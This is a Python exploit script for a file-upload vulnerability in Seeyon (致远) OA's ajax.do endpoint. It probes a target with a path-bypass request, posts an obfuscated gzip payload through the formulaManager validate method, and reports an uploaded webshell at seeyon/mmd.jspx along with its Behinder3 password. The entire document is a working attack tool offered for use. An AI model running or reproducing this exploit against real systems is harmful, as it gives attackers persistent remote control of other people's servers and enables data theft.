#!/usr/bin/python3
# Author 9527
# 致远OA-ajax.do文件上传漏洞

import sys
import requests
import time
from urllib3.exceptions import InsecureRequestWarning
from scripts import printColor


def check(ip):
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    target = ip

    CheckUrl = target + '/seeyon/thirdpartyController.do.css/..;/ajax.do'

    payload = target + '/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip'

    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9" \
                           "loginPageURL=; login_locale=zh_CN;",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    shellcode = "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTY%C2%93%C2%A2H%10%7E%C3%9E%C3%BD%15%C2%84%2F%C3%9A%C3%9136%C2%82%C2%8C%C3%ADN%C3%ACC%7B%21%C2%A2%C2%A8%C2%A0%5C%1B%C3%BB%00U%C3%88a%15%C2%B0rH%C3%991%C3%BF%7D%0B%C2%B0%C2%A7%7Bb%7B%C3%AB%C2%A52%C2%B32%C2%BF%C3%8A%C3%BB%C2%AF%C3%97%C3%AE%29%C2%B9%C3%A0%029%07%C2%92z%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%B8%C2%96ts%2F%C3%8B%C2%BB%C3%AF%C3%A2y%C2%95%5E%C2%BC%2C%0B%C2%93%C2%B8%7E%C3%94%C3%B2K%18%C3%BBL%C3%AA%C3%A4%01%C3%B3%27%C3%93%C3%A9%C3%B7%C2%9F%C2%AE%C2%9E%C3%AB%C2%A4i%C3%B6%C2%94y%1EI%C3%A2%C2%A7%C3%8E%C3%B7%C3%9F%C2%99%C3%B6%C3%BC%169%C2%A5%C3%93%0F%C2%93%C3%BE%C2%8E%C2%9A%C3%A4%C3%86%25%C3%8C%C2%BD%0B%C2%93%C2%BE%C3%93%1C%05%C2%88%C2%BD%2B%C3%B3%C2%89Z%C2%AF%C3%86%7F%C3%AC%60%0C%C3%BBQ%C2%96V%C2%9D%C2%87%C2%9F%C2%A0%C3%8C%C3%9D%C2%81%2C%C3%B0%10%C2%AA%3D%C3%98%C2%89%C3%A9%0D%C3%8CR%C3%A2rcVZ%06%C2%B9%2B%0A%C2%B7-%C2%AEel%C3%A8%2CU%16%C3%8C%C2%92r%C3%8D%C2%A5%01%C3%84%C3%B3%02%C3%B0z%C2%B1%C3%86J%C3%A9jc%C3%B98x%29%C2%8F%C3%A2%22%C2%B65%C3%89%C2%87X%27%C2%80C%C2%A5%1B%C2%B1%C3%A1F%1B%12%29%1A%3E%3B%C2%B1r%C3%9Db5%05X%C2%8F%C2%A0%C2%888%5B%13%C2%AE%C2%96%01%C2%91%24%C2%A2%1C%C2%88c%02k%7C%C2%BC%C3%A0%2CM%18%C3%90%C3%B7l%1D%26Y%C3%83%C2%9B%7Ea%C3%B1%2B%01%2C%C3%95%C3%B2S%19%C3%85%C2%B5%C2%8DM%21%C2%87R%C2%B9%C2%8B%C2%AA%7F%00%C3%BF%C3%B2%C3%8D%16%C3%B5%C3%88%15%17%C3%842%C3%95%C3%94%C3%A5%C2%86%C2%8F%C2%92%C2%A8d%C2%96%C2%A9%C3%9C%C2%A4%C3%85%C3%91%C2%B7%C3%8D%C2%80%C2%B5%0D%C3%A1%0C%C3%88dFun%C2%80%C2%ADJ%C3%8BP%11%C2%88s%5D%C2%9E%C2%B7z%07q%1CP%0C%22%C2%89%C2%9B%C3%94%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%959%C3%86%C3%86%C3%9FsU%00%C3%B8%C2%8Do%C2%93+%C3%B4L%15I%C2%8B%1CZ%21%1A%C3%91%C3%B8Xh%C2%AE%0Ai%C3%99%C3%9A%C2%AD%C2%B1%C2%8Al%C2%8C%0A%C3%BB%C3%98b%C3%8B%C2%A2%C2%94m%C2%A6U%C2%B8%C3%86%15r1d%C2%9D%C3%A9yt2%C3%99g%C2%9A%C3%93%3A%C3%AFg%C3%9B%C2%A8%C3%B5V%01%C3%8D%01%C3%8D%C3%9F%3Do%C2%B1%12%01%C2%8C%C2%AEP%C2%AC%10%C2%9C%09%07%C2%B8%5C%C2%A5.%06%C2%BEscC%C3%BB%C2%B0%1F%C3%98%C2%87%0D%C3%99%1A6%C2%B2%22%C3%BD%C2%BC%3DH%03%2B%C2%94F%C2%80%C3%93oM%0DB%C3%A1%0AM%C3%95%C2%B0%C2%8Cj%60k%7E%085%29s%C3%88y%C2%B4%C3%A7%C3%90%C3%95ic%1C%C2%BF%C3%91k%0C%11%C2%9C%23ZW5p%C2%B1%C2%82%C3%A4%C3%A9j%C2%A2%C3%AA%C2%9BP%3E%C3%A4%C3%91%C2%9A%C3%86%C3%A0%C2%98%C3%BBd%13V%C2%85m%02%C3%BF%C3%88%C3%A9Q%1D%C2%AB%C3%86%C3%A9%C3%82%C2%91%C2%9F+%C2%8B%C3%B8%C3%89%C2%87%3Fc%C3%BB%C3%97%3FS%C2%99H%C2%A1%C2%AC5%C3%B2i%C2%9D%2F%40%C3%BCt%C3%BD%C2%86%C2%AF%C2%9DG.%C3%96yZ%C2%9F%04%C2%8AA%0AH%C2%A3%C3%97%C3%96%C2%A7%C3%96k%C3%BC%C3%BA%C2%B56%C3%B2%C3%B4L%C3%A5+%C2%B1%C2%88pvY%C2%9B%C3%A6c%C2%91%C3%89%C2%A2%C2%80+%C2%99%C3%9C%C2%A01%2C%5C%03%C3%9D%C3%A8%C3%9Bt%C2%AF%2B%0B%25R%C3%A74%C2%AF%C3%A5%C3%9D%C2%AEh%C3%BA%C2%83S%C3%91%3E%C3%96%C2%B1M%7BU%5E%C2%AE%100u%04%C3%B8%7Das%3A%7B%C3%84%C3%BA%C3%9B%1F%05%C2%A8i%3A%C2%B3.%3E%26%C3%94%C3%8F%C2%94%C3%86%40%C3%A3%C2%87%2B7VX%C3%8B%10%22%1A%1F%C3%B5C%C2%AF%C2%A0%C2%B1%C3%88%00%09%C2%9A%C2%9E%C3%9Es%C3%A3%02%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7%10%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%A8Z%C2%B6u%5D%C2%95.%C2%BF%7F%7C%C2%9Fq%26%2B%C3%A2%3E%0E3%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07%12H%C3%87%1C%C3%9E%C3%AFv%C3%82%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFIq%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87-%C3%93o%18%14%C3%B7%3E%C2%82%C3%BF%C2%9F.%40I%C3%A6Q%C3%87%7E%7C%C2%AF%C2%B7+%25%C2%A0wb%C2%B2%C3%9C%C3%89C%C3%80TU%C3%95%7Bx%C3%AD%C3%BE%C2%A0%C2%AB%C2%91%C2%AE%C3%87%C3%97%C3%BA%C3%8E%2F%C2%85%C3%97%C3%BD%C3%BB_%2F%07M%C2%ADU%05%00%00"
    pc = printColor.Colors()
    CheckRP = requests.post(url=CheckUrl, headers=headers, verify=False, timeout=10)
    if ('java.lang.NullPointerException:null' in CheckRP.text):
        pc.print_red_text("[+] 致远OA-ajax.do上传文件漏洞: Target is vuln!")
        print("[+].......Sending exploit code.......")
        time.sleep(1)
        try:
            response = requests.post(url=payload, data=shellcode, headers=headers, verify=False, timeout=10)
            if ('0614448583' in response.text):
                print("[+]Upload successfully!")
                print("[+]Webshell localtion: ")
                print(target + "seeyon/mmd.jspx")
                print("[+] \"Behinder3\" password: \"rebeyond\"")
                return 1
            elif ('-1' in response.text):
                print("[-] 被迫下线，原因：与服务器失去连接")
                # print(response.text)
            else:
                print("[-] Upload Failed!")

        except exceptions as e:
            print("[!] Server Error!")

    else:
        print("致远OA-ajax.do上传文件漏洞 is not vuln!")